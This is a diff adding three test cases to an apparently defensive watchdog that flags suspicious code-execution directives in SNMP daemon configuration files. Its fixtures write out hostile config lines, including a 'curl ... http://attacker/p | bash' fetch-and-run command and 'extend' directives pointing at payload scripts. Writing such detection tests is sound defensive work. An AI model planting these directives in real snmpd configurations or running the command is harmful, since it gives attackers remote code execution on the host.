@@ -202,3 +202,44 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-snmpd-exec -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no-auto-trust: snmpd-exec-watchdog does NOT refresh baseline on suspicious-directive detection — alert STAYS until operator updates)" {
+    # T1546/T1059 SNMP-remote-trigger code execution primitive —
+    # alert MUST persist across runs until operator explicitly
+    # re-baselines. Sister to dhcpd-exec, gss-mech, ld-preload,
+    # nm-vpn-plugin, openvpn-config — active-injection class never
+    # auto-trusts.
+    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
+    run_wd
+    printf 'extend evilcheck /tmp/payload.sh\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — sister to wget-pipe-sh axis)" {
+    # Attacker may swap wget→curl and sh→bash. Both downloader-
+    # tool and shell variants must trigger.
+    printf 'pass .1.3.6.1.4.1.8072 /bin/bash -c "curl -fsSL http://attacker/p | bash"\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: snmpd.conf.d drop-in scanned alongside main snmpd.conf)" {
+    # snmpd reads /etc/snmp/snmpd.conf.d/*.conf drop-ins (Debian/
+    # RHEL packaging convention). A planted drop-in with a
+    # suspicious extend directive MUST be flagged.
+    SNMPD_D="${TMP}/snmpd.conf.d"; mkdir -p "${SNMPD_D}"
+    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
+    printf 'extend evilcheck /tmp/drop-in-payload.sh\n' > "${SNMPD_D}/99-evil.conf"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_SNMPD_PROFILE=report \
+    SELFDEF_SNMPD_BASELINE="${BASELINE}" \
+    SELFDEF_SNMPD_DIRS="${SNMPD_D}" \
+    SELFDEF_SNMPD_FILES="${CONF}" \
+        bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
